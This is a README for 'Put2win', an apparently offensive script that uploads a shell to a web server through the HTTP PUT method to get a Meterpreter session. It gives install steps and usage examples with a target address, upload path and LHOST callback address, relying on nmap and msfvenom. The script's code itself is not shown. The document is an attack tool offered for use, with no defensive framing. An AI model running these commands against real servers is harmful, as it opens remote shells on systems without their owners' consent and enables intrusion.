# Put2win
[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/dwyl/esta/issues)

Script to automatize shell upload by PUT HTTP method to get meterpreter

[![asciicast](https://asciinema.org/a/204195.png)](https://asciinema.org/a/204195)

# Dependencies
It's necessary to have installed nmap and msfvenom tools for a correct operation

# Installation
```
git clone https://github.com/sysdevploit/put2win
cd put2win
chmod +x put2win.sh
```

# Usage
```
This script automatize shell upload by PUT HTTP method to get meterpreter.

Usage:
 ./Put2win.sh -t TARGET [-p PORT] -u URL_PATH -l LHOST

Examples:
 - ./Put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10
 - ./Put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10
 ```
 
# Contact
Telegram: @devploit

Twitter: https://www.twitter.com/devploit
